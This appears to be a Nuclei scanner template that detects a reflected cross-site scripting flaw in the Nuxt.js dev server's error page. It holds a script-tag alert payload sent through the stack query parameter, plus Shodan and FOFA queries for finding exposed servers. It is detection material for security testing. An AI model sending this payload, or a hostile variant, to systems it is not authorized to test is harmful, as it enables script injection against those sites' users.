http:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - '{{payload}}'
    - window.__NUXT__
  - part: header
    type: word
    words:
    - text/html
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/__nuxt_error?stack=%0A{{url_encode(payload)}}'
id: nuxt-js-xss
info:
  author: DhiyaneshDK
  description: 'The developer server unsafely renders the stack trace within errors.
    This can be manipulated by sending a specially crafted request.

    '
  metadata:
    fofa-query: body="buildAssetsDir" && body="__nuxt"
    max-request: 1
    shodan-query: html:"buildAssetsDir" "nuxt"
    verified: true
  name: Nuxt.js Error Page - Cross-Site Scripting
  reference:
  - https://huntr.dev/bounties/70ac720d-c932-4ed3-98b1-dd2cbcb90185/
  - https://bryces.io/blog/nuxt3
  - https://twitter.com/fofabot/status/1669339995780558849
  severity: medium
  tags: huntr,xss,nuxtjs,vuln
variables:
  payload: <script>alert(document.domain)</script>
